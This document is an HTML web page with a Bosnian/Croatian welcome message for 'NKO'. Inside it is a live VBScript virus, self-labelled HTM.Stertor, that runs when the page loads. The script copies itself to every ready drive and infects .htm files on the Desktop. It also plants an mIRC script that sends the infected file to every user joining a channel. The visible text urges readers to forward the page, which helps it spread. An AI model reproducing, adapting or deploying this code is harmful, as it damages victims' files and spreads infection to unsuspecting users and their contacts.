<!--Stertor-->
<HTML>
<HEAD>
<TITLE>Ja Znam...</TITLE>
</HEAD>
<BODY background="" bgColor=mediumblue bgProperties=fixed vLink=lawngreen>
<script language = vbscript>
dim fso,a,b,c,d,e,f,g,wHost,zHost, vMirc
on error resume next
wHost = document.body.innerHTML   
set fso = createobject("scripting.filesystemobject")
set a = fso.Drives 
set c = fso.CreateTextFile("c:\Salim_se!.htm",true) 
c.WriteLine "<!--Stertor-->"
c.WriteLine "<HTML>"
c.WriteLine "<BODY>"
c.writeline wHost
c.WriteLine "</BODY>"
c.WriteLine "</HTML>"
c.close
for each b in a 
if b.isready then
if b.drivetype = 1 or 2 then 
fso.CopyFile "C:\Salim_se!.htm", b.driveletter & ":\",true
end if
end if
next 
set d = fso.GetFolder(fso.GetSpecialFolder(WindowsFolder) & "\" & "Desktop").Files 
for each e in d
if fso.GetExtensionName(e.Name) = "htm" then
set f = fso.OpenTextFile(e.path,1,false) 
if f.readline <> "<!--Stertor-->" then
zHost = f.readall()
set g = fso.OpenTextFile(e.path,2,false)
g.WriteLine "<!--Stertor-->"
g.WriteLine "<HTML>"
g.WriteLine "<BODY>"
g.writeline wHost
g.WriteLine "</BODY>"
g.WriteLine "</HTML>"
g.WriteLine zHost
g.close()
end if
end if
next 
Set vMirc = fs.CreateTextFile("C:\Mirc\script.ini", True)
vMirc.writeline "[script]"
vMirc.writeline "n0=on 1:JOIN:#:{"
vMirc.writeline "n1= /if ( "+Chr(10+10+10+6)+"nick == "+Chr(10+10+10+6)+"me ) { halt }"
vMirc.writeline "n2= /.dcc send "+Chr(10+10+10+6)+"nick c:\Salim_se!.htm"
vMirc.writeline "n3=}"
'HTM.Stertor by e[ax]
</script>
<P align=center 
style="BACKGROUND-ATTACHMENT: fixed; BACKGROUND-COLOR: midnightblue; TEXT-DECORATION: none"><FONT 
color=#00bfff><FONT 
size=4><STRONG>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Dobrodosli na stranice NKO!<BR></P></STRONG></FONT></FONT>
<P align=center><BR><BR><STRONG><FONT color=#00bfff size=4>Cijeli projekat je 
zapocet 2000 u decembru mjesecu i to pod kodnim imenom Stertor. Toliko za ovaj 
put, za vise informacija pogledajte stranice EBV 
Labs-a.&nbsp;</FONT></STRONG></P>
<P align=center><FONT color=#00bfff></FONT>&nbsp;</P>
<P align=center><FONT><FONT size=4><STRONG><FONT color=#00bfff>p.s.<BR>Posaljite 
ovaj dokument i drugima da bi bili u toku razvoja ovog 
projekta!</FONT>&nbsp;</STRONG></FONT></FONT></P>
</BODY>
</HTML>